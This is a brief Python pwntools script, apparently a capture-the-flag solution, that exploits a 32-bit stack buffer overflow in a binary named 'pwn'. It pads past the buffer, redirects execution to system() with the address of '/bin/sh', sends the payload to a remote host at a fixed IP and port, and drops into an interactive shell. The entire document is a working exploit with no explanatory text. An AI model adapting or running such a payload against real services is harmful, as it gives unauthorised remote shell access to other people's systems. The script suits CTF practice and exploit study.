from pwn import *
context(arch="i386",os="linux",log_level="debug")
elf=ELF("./pwn")
system_addr=elf.symbols["system"]
bin_sh_addr=elf.search("/bin/sh").next()
payload="a"*(0x88+0x4)+p32(system_addr)+p32(0)+p32(bin_sh_addr)
p=remote("111.198.29.45",57271)
p.recvline()
p.send(payload)
p.interactive()
